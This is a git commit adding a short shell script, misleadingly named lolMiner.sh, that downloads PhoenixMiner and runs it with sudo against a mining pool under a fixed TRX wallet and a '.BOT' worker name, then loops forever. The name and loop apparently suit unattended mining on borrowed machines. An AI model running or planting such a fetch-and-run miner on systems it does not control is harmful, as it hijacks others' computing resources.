738ff454540d95a227b8bed8ca2f590de17c9def
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-03-14 04:45:35 +0530

    Create lolMiner.sh

---
+++ lolMiner.sh
@@ -0,0 +1,19 @@
+
+#!/bin/sh
+
+apt-get install libpci3 
+
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
+
+tar -xf PhoenixMiner_5.6d_Linux.tar.gz  &&cd PhoenixMiner_5.6d_Linux 
+
+sudo ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal TRX:TMzKaWi1k3KadGMV2jfTSeNEZTpTYhjJYN.BOT -pass x  -tt 80 -a coinX -tstop 84 -tstart 74  -fret 2 -rate 1
+
+while [ 1 ]; do
+
+sleep 3
+
+done
+
+sleep 999
+
